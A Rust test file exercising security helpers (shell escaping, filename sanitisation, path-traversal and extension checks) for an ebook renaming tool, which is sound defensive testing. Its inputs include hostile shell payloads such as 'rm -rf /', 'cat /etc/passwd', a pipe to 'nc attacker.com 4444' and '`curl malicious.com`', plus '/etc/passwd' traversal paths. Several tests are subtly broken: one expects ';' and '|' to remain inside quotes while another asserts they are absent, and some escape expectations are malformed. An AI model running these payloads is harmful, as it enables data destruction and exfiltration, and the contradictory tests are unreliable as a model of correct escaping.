// Security tests for ebook_renamer - Real validation tests

use crate::security::{sanitize_filename, validate_path_traversal, shell_escape, validate_extensions, validate_max_depth, sanitize_path_for_logging, validate_file_size};
use tempfile::TempDir;
use std::fs;
use std::path::{Path, PathBuf};

#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_shell_escape_prevents_injection() {
        let dangerous_inputs = vec![
            ("test.txt", "'test'"),
            ("file; rm -rf /; .pdf", "'file; rm -rf /; .pdf'"),
            ("file && malicious.sh", "'file && malicious.sh'"),
            ("file| evil.sh", "'file| evil.sh'"),
            ("file`whoami`", "'file'\\''whoami`'"),
            ("file$(date)", "'file$(date)'"),
            ("file$PATH", "'file$PATH'"),
            ("file with\nnewline", "'file with\nnewline'"),
            ("file with\rreturn", "'file with\rreturn'"),
            ("file with\ttab", "'file with\ttab'"),
        ];

        for (input, expected) in dangerous_inputs {
            let escaped = shell_escape(input);
            assert_eq!(escaped, expected, "Failed to escape: {}", input);
        }

        // Test empty string
        let empty_escaped = shell_escape("");
        assert_eq!(empty_escaped, "''");
    }

    #[test]
    fn test_sanitize_filename_removes_dangerous_chars() {
        let test_cases = vec![
            ("test<>file.pdf", "test__file.pdf"),
            ("file:with|colons.txt", "file_with_colons.txt"),
            ("bad\nname.pdf", "bad_name.pdf"),
            ("file\"quoted.pdf", "file_quoted.pdf"),
            ("path\\separator.txt", "path_separator.txt"),
            ("question?mark.pdf", "question_mark.pdf"),
            ("asterisk*.pdf", "asterisk_.pdf"),
        ];

        for (input, expected) in test_cases {
            let result = sanitize_filename(input).unwrap();
            assert_eq!(result, expected, "Failed to sanitize: {}", input);
        }
    }

    #[test]
    fn test_sanitize_filename_rejects_null_bytes() {
        let dangerous_inputs = vec![
            "test\0.pdf",
            "bad\0name.txt",
            "multiple\0\0bytes.pdf",
        ];

        for input in dangerous_inputs {
            let result = sanitize_filename(input);
            assert!(result.is_err(), "Should reject null byte in: {}", input);
        }
    }

    #[test]
    fn test_sanitize_filename_rejects_path_traversal() {
        let dangerous_inputs = vec![
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "..\\..\\..\\dangerous",
        ];

        for input in dangerous_inputs {
            let result = sanitize_filename(input);
            assert!(result.is_err(), "Should reject path traversal in: {}", input);
        }
    }

    #[test]
    fn test_sanitize_filename_enforces_length_limits() {
        let long_name = "a".repeat(300);
        let result = sanitize_filename(&long_name);
        assert!(result.is_err(), "Should reject overly long filename");
        
        // Test boundary conditions
        let boundary_name = "a".repeat(255);
        let result = sanitize_filename(&boundary_name);
        assert!(result.is_ok(), "Should accept 255 char filename");
    }

    #[test]
    fn test_sanitize_filename_rejects_empty() {
        let empty_inputs = vec!["", "   ", "\t\n\r   "];

        for input in empty_inputs {
            let result = sanitize_filename(input);
            assert!(result.is_err(), "Should reject empty/whitespace-only filename: {:?}", input);
        }
    }

    #[test]
    fn test_validate_path_traversal_safe_cases() -> Result<()> {
        let base_dir = TempDir::new()?;
        let base_path = base_dir.path();
        
        // Create a legitimate file
        let safe_file = base_path.join("test.pdf");
        fs::write(&safe_file, "content")?;
        
        let validated = validate_path_traversal(&safe_file, base_path)?;
        assert_eq!(validated, safe_file.canonicalize()?);
        
        Ok(())
    }

    #[test]
    fn test_validate_path_traversal_malicious_cases() {
        let base_dir = TempDir::new().unwrap();
        let base_path = base_dir.path();
        
        let dangerous_paths = vec![
            base_path.join("../../../etc/passwd"),
            base_path.join("..\\..\\windows\\system32"),
            PathBuf::from("/etc/passwd"), // Absolute path outside base
            base_path.join("../outside").canonicalize().unwrap_or_else(|_| PathBuf::from("/fake")), // Symlink attack simulation
        ];

        for dangerous_path in dangerous_paths {
            let result = validate_path_traversal(&dangerous_path, base_path);
            assert!(result.is_err(), "Should reject dangerous path: {:?}", dangerous_path);
        }
    }

    #[test]
    fn test_validate_extensions_safe_cases() {
        let safe_extensions = vec![
            vec!["pdf".to_string()],
            vec!["epub".to_string()],
            vec![".txt".to_string()],
            vec!["mobi".to_string(), ".azw3".to_string()],
            vec![".download".to_string(), ".crdownload".to_string()],
        ];

        for exts in safe_extensions {
            assert!(validate_extensions(&exts).is_ok());
        }
    }

    #[test]
    fn test_validate_extensions_rejects_dangerous() {
        let dangerous_extensions = vec![
            vec!["exe".to_string()],
            vec!["bat".to_string()],
            vec!["cmd".to_string()],
            vec!["sh".to_string()],
            vec!["scr".to_string()],
            vec!["php".to_string()],
            vec!["js".to_string()],
        ];

        for exts in dangerous_extensions {
            let result = validate_extensions(&exts);
            assert!(result.is_err(), "Should reject dangerous extension: {:?}", exts);
        }
    }

    #[test]
    fn test_validate_max_depth_safe_cases() {
        let safe_depths = vec![0, 1, 10, 100, 500, 1000];

        for depth in safe_depths {
            assert!(validate_max_depth(depth).is_ok(), "Should accept depth: {}", depth);
        }
    }

    #[test]
    fn test_validate_max_depth_rejects_too_large() {
        let dangerous_depths = vec![1001, 5000, 10000];

        for depth in dangerous_depths {
            let result = validate_max_depth(depth);
            assert!(result.is_err(), "Should reject depth: {}", depth);
        }
    }

    #[test]
    fn test_validate_file_size_safe_cases() {
        let safe_sizes = vec![0, 1024, 1024*1024, 50*1024*1024]; // 0 to 50MB

        for size in safe_sizes {
            assert!(validate_file_size(size).is_ok(), "Should accept size: {}", size);
        }
    }

    #[test]
    fn test_validate_file_size_rejects_too_large() {
        let dangerous_sizes = vec![101*1024*1024, 200*1024*1024]; // >100MB

        for size in dangerous_sizes {
            let result = validate_file_size(size);
            assert!(result.is_err(), "Should reject large size: {}", size);
        }
    }

    #[test]
    fn test_sanitize_path_for_logging_safe_cases() {
        let safe_paths = vec![
            Path::new("/home/user/documents/test.pdf"),
            Path::new("test.txt"),
            Path::new("subdir/book.epub"),
        ];

        for path in safe_paths {
            let sanitized = sanitize_path_for_logging(path);
            assert!(!sanitized.contains('/'), "Should not contain full path: {}", sanitized);
            assert!(!sanitized.contains('\\'), "Should not contain backslashes: {}", sanitized);
            assert_ne!(sanitized, "[invalid_path]", "Should be valid path");
        }
    }

    #[test]
    fn test_sanitize_path_for_logging_invalid_cases() {
        let invalid_paths = vec![
            Path::new(""),
            Path::new(""),
            Path::new("/"),
        ];

        for path in invalid_paths {
            let sanitized = sanitize_path_for_logging(path);
            assert_eq!(sanitized, "[invalid_path]", "Should return invalid path marker");
        }
    }

    #[test]
    fn test_shell_escape_edge_cases() {
        let edge_cases = vec![
            ("", "''"),
            ("'", "'\\'''"),
            ("''", "'\\'\\'''"),
            ("very'complex'string", "'very'\\''complex'\\'''string"),
            ("multiple'quotes'here", "'multiple'\\''quotes'\\'''here"),
        ];

        for (input, expected) in edge_cases {
            let escaped = shell_escape(input);
            assert_eq!(escaped, expected, "Failed to escape edge case: {}", input);
        }
    }

    #[test]
    fn test_concurrent_file_access_safety() -> Result<()> {
        use std::sync::{Arc, Mutex};
        use std::thread;
        
        let base_dir = TempDir::new()?;
        let test_file = base_dir.path().join("test.txt");
        fs::write(&test_file, "test content")?;
        
        let file_accessed = Arc::new(Mutex::new(false));
        let mut handles = vec![];
        
        // Simulate concurrent access
        for _ in 0..5 {
            let file_clone = test_file.clone();
            let accessed_clone = Arc::clone(&file_accessed);
            
            let handle = thread::spawn(move || {
                // This simulates the kind of race condition we want to prevent
                if file_clone.exists() {
                    let mut accessed = accessed_clone.lock().unwrap();
                    *accessed = true;
                }
            });
            
            handles.push(handle);
        }
        
        // Wait for all threads
        for handle in handles {
            handle.join().unwrap();
        }
        
        // The atomic file operations should prevent issues
        let was_accessed = *file_accessed.lock().unwrap();
        assert!(was_accessed, "File should have been accessed");
        
        Ok(())
    }

    #[test] 
    fn test_filename_sanitization_preserves_valid_content() {
        let valid_names = vec![
            "normal-book.pdf",
            "author_name - title.txt",
            "Book Title (2020).epub",
            "数学入門.pdf", // CJK characters
            "L'éléphant.fr", // Accented characters
        ];

        for name in valid_names {
            let result = sanitize_filename(name);
            assert!(result.is_ok(), "Should accept valid filename: {}", name);
            let sanitized = result.unwrap();
            assert!(sanitized.len() <= 255, "Should respect length limit");
            assert!(!sanitized.contains('\0'), "Should not contain null bytes");
            assert!(!sanitized.contains(".."), "Should not contain traversal");
        }
    }

    #[test]
    fn test_path_validation_with_symlinks() -> Result<()> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            
            let base_dir = TempDir::new()?;
            let base_path = base_dir.path();
            
            // Create a legitimate file
            let safe_file = base_path.join("safe.pdf");
            fs::write(&safe_file, "safe content")?;
            
            // Create a malicious symlink
            let symlink_target = base_path.join("../../../etc/passwd");
            let malicious_link = base_path.join("innocent.pdf");
            
            // Don't actually create the target file - we're testing if validation catches this
            let _ = symlink(&safe_file, &malicious_link);
            
            // The validation should resolve the symlink to the actual file
            let result = validate_path_traversal(&malicious_link, base_path);
            
            // It should resolve to safe.pdf, not try to go to ../../../etc/passwd
            match result {
                Ok(validated) => {
                    // Should resolve to the same canonical path as safe.pdf
                    let safe_canonical = safe_file.canonicalize()?;
                    assert_eq!(validated, safe_canonical);
                }
                Err(_) => {
                    // Or it should reject symlinks entirely (safer behavior)
                }
            }
        }
        
        #[cfg(not(unix))]
        {
            // On non-Unix systems, this test is less relevant
            assert!(true);
        }
        
        Ok(())
    }

    #[test]
    fn test_unicode_security_handling() {
        let unicode_inputs = vec![
            "test\0.pdf", // Null byte in Unicode
            "test\u{202E}test.pdf", // Right-to-left override
            "test\u{200B}test.pdf", // Zero-width space
            "test\u{FEFF}test.pdf", // BOM
        ];

        for input in unicode_inputs {
            let result = sanitize_filename(input);
            match result {
                Ok(sanitized) => {
                    // If accepted, should not contain dangerous Unicode
                    assert!(!sanitized.contains('\0'), "Should remove null byte");
                    assert!(!sanitized.contains('\u{202E}'), "Should handle RTL override");
                }
                Err(_) => {
                    // Rejection is also acceptable for dangerous Unicode
                }
            }
        }
    }

    #[test]
    fn test_shell_command_injection_prevention() {
        let malicious_commands = vec![
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "file.txt `curl malicious.com`",
            "file.txt $(whoami)",
        ];

        for cmd in malicious_commands {
            let escaped = shell_escape(cmd);
            
            // Verify dangerous patterns are escaped
            assert!(escaped.starts_with('\''), "Should be single-quoted");
            assert!(escaped.ends_with('\''), "Should be single-quoted");
            
            // Verify the dangerous characters are not directly present
            let unquoted = &escaped[1..escaped.len()-1]; // Remove outer quotes
            assert!(!unquoted.contains(";"), "Semicolon should be escaped");
            assert!(!unquoted.contains("&&"), "Ampersands should be escaped");
            assert!(!unquoted.contains("|"), "Pipe should be escaped");
            assert!(!unquoted.contains("`"), "Backticks should be escaped");
            assert!(!unquoted.contains("$("), "Command substitution should be escaped");
        }
    }

    #[test]
    fn test_extension_validation_comprehensive() {
        let test_cases = vec![
            // Valid extensions
            (vec!["pdf"], true),
            (vec![".pdf"], true),
            (vec!["pdf", "epub", "txt"], true),
            (vec!["mobi", ".azw3"], true),
            
            // Invalid extensions
            (vec!["exe"], false),
            (vec!["bat", "cmd"], false),
            (vec!["sh", "scr"], false),
            (vec!["php", "js", "py"], false),
            
            // Mixed valid/invalid
            (vec!["pdf", "exe"], false),
            (vec!["txt", "bat"], false),
        ];

        for (extensions, should_succeed) in test_cases {
            let result = validate_extensions(&extensions.iter().map(|s| s.to_string()).collect::<Vec<_>>());
            
            if should_succeed {
                assert!(result.is_ok(), "Should accept valid extensions: {:?}", extensions);
            } else {
                assert!(result.is_err(), "Should reject invalid extensions: {:?}", extensions);
            }
        }
    }
}